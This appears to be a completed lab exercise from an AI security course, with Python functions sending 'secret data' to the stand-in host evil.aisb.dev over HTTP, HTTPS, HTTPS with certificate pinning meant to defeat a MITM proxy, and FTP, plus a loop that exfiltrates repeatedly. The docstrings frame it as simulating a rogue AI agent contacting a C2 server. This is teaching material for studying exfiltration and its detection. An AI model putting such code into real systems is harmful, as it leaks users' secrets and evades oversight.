# %%
import os
import base64
import time

from typing import Optional, Dict, Any
from unittest.mock import patch, MagicMock
import requests


def make_evil_request(secret_data: str) -> Optional[str]:
    """
    Send a GET request to evil.aisb.dev with secret data.

    This simulates an AI agent attempting to communicate with an external C2 server.
    The secret data is sent as a query parameter.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails or throws
    """
    # TODO: Implement the function to:
    #   1. Make a GET request to http://evil.aisb.dev/exfiltrate?data=secret_data
    #      - to ensure tests pass, use `requests.get(url, params=..., timeout=5)`
    #      - if the tests fail and you are pretty sure you are making the correct request, you can ignore the first test
    #   2. Return the response text if successful (status 200), None otherwise

    if secret_data is None:
        params = {}
    else:
        params = {"data": secret_data}

    url = "http://evil.aisb.dev/exfiltrate"

    try:
        get_body = requests.get(url, params=params, timeout=5)
    except ConnectionError:
        return None
    except Exception as e:
        print(f"error: {e}")
        return None

    if get_body.status_code == 200:
        return get_body.text
    else:
        return None


import w1d2_test

w1d2_test.test_make_evil_request(make_evil_request)
exfiltrate_data = make_evil_request


def make_evil_request_https(secret_data: str) -> Optional[str]:
    """
    Send a GET request over HTTPS to evil.aisb.dev with secret data.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails
    """
    # TODO: Implement the function to:
    #   1. Make a GET request to https://evil.aisb.dev/exfiltrate?data=secret_data
    #   2. Return the response text if successful (status 200), None otherwise

    if secret_data is None:
        params = {}
    else:
        params = {"data": secret_data}

    url = "https://evil.aisb.dev/exfiltrate"

    try:
        get_body = requests.get(url, params=params, timeout=5)
    except ConnectionError:
        return None
    except Exception as e:
        print(f"error: {e}")
        return None

    if get_body.status_code == 200:
        return get_body.text
    else:
        return None


from w1d2_test import test_make_evil_request_https

test_make_evil_request_https(make_evil_request_https)


# Update the exfiltrate_data function to use HTTPS
exfiltrate_data = make_evil_request_https


# %%
def make_evil_request_pinned(secret_data: str) -> Optional[str]:
    """
    Send a GET request over HTTPS with certificate pinning to evil.aisb.dev.

    This function uses certificate pinning to ensure we're talking to the real
    evil.aisb.dev server, not a MITM proxy with a self-signed certificate.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails
    """
    try:
        # Use HTTPS with certificate pinning
        url = "https://evil.aisb.dev/exfiltrate"
        params = {"data": secret_data}

        # Pin to ISRG Root X1 (Let's Encrypt root certificate)
        # In a real scenario, you'd include this certificate file with your agent
        response = requests.get(
            url,
            params=params,
            timeout=5,
            verify="isrg-root-x1.pem",  # Pin to specific root certificate
        )

        # Check if request was successful
        if response.status_code == 200:
            return response.text
        else:
            print(f"Request failed with status code: {response.status_code}")
            return None

    except requests.exceptions.SSLError as e:
        # This will trigger if the certificate doesn't match our pinned cert
        print(f"Certificate validation failed (possible MITM?): {e}")
        return None
    except FileNotFoundError:
        print("Certificate file 'isrg-root-x1.pem' not found")
        return None
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None


from w1d2_test import test_make_evil_request_pinned

test_make_evil_request_pinned(make_evil_request_pinned)

exfiltrate_data = make_evil_request_pinned
# %%
from ftplib import FTP


def make_evil_request_ftp(secret_data: str) -> Optional[str]:
    """
    Send a request over FTP to ftp.scene.org with secret data.

    This simulates an AI agent attempting to exfiltrate data using a non-HTTP protocol.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails
    """
    try:
        ftp = FTP("ftp.scene.org")
        ftp.login()
        # ftp.cwd("pub")
        ls_out = ftp.retrlines("LIST")
        return ls_out
    except Exception as e:
        print(f"Identified error: {e}")
        return None

    # TODO: Implement the function to:
    #   1. Connect to ftp.scene.org using the ftplib library
    #   2. Read some data (e.g., list files in the root directory)
    #   3. Return the response text if successful, None otherwise


from w1d2_test import test_make_evil_request_ftp

test_make_evil_request_ftp(make_evil_request_ftp)


if __name__ == "__main__":  # Only executed when running the script directly
    """
    Make requests to the evil server with different secret data.
    This simulates an AI agent repeatedly trying to exfiltrate data.
    """

    def loop_exfiltration():
        while True:
            global exfiltrate_data
            try:
                time.sleep(5)
                print(exfiltrate_data("some_secret_data"))
            except KeyboardInterrupt:
                print("Stopping exfiltration loop.")
                break

    import threading

    thread = threading.Thread(target=loop_exfiltration)
    thread.start()

# %%

# %%

# %%

# %%
